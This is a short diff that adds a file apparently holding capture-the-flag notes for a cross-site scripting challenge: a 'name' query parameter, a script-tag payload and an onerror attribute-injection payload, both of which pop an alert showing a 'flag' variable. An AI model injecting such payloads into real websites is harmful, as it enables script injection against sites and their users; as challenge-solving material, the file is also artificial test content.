@@ -1,0 +1,6 @@
+?name=CCSLynx
+
+<script>alert(flag)</script>
+
+
+src="x" onerror="alert(flag)"
